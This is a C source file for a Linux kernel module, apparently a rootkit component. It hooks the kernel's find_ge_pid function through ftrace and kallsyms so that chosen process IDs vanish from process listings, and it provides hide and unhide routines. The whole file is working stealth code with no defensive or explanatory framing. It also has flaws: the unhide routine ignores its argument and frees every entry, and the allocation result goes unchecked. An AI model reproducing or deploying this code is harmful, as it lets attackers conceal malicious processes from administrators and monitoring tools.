#include "process_hide.h"

#include <linux/sched.h>
#include <linux/proc_fs.h>
#include <linux/kallsyms.h>
#include <linux/sched/signal.h>

#include "hook.h"
#include "consts.h"


typedef struct pid *(*find_ge_pid_function)(int nr, struct pid_namespace *ns);

find_ge_pid_function real_find_ge_pid;

struct ftrace_hook hook;

LIST_HEAD(hidden_processes);

bool is_hidden_process(pid_t pid) {
    ProcessId* process_id;
    ProcessId* temp_process_id;
    list_for_each_entry_safe(process_id, temp_process_id, &hidden_processes, list_node) {
        if (process_id->id == pid) {
            return true;        
        }
    }
    return false;
}

struct pid *fh_find_ge_pid(int nr, struct pid_namespace *ns) {
    struct pid* pid = real_find_ge_pid(nr, ns);
    while (NULL != pid && is_hidden_process(pid->numbers->nr)) {
        pid = real_find_ge_pid(pid->numbers->nr + 1, ns);
    }
    return pid;
}

void init_hook(void) {
    real_find_ge_pid = (find_ge_pid_function)kallsyms_lookup_name("find_ge_pid");
    hook.name = "find_ge_pid";
    hook.function = fh_find_ge_pid;
    hook.original = &real_find_ge_pid;
    fh_install_hook(&hook);
}

int hide_process(pid_t pid) {
    ProcessId* process_id = (ProcessId*)kmalloc(sizeof(ProcessId), GFP_KERNEL);
    process_id->id = pid;
    list_add_tail(&process_id->list_node, &hidden_processes);
    return SUCCESS;
}

int unhide_process(pid_t pid) {
    ProcessId* process_id;
    ProcessId* temp_process_id;
    list_for_each_entry_safe(process_id, temp_process_id, &hidden_processes, list_node) {
        list_del(&process_id->list_node);
        kfree(process_id);
    }
    return SUCCESS;
}